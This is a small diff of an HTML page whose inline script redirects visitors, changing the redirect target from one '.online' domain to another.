@@ -9,7 +9,7 @@
 </head>
 <body>
 	<script>
-		window.location.replace('https://montrealcredit.online/');
+		window.location.replace('https://southmonument.online/');
 	</script>
 </body>
 </html>
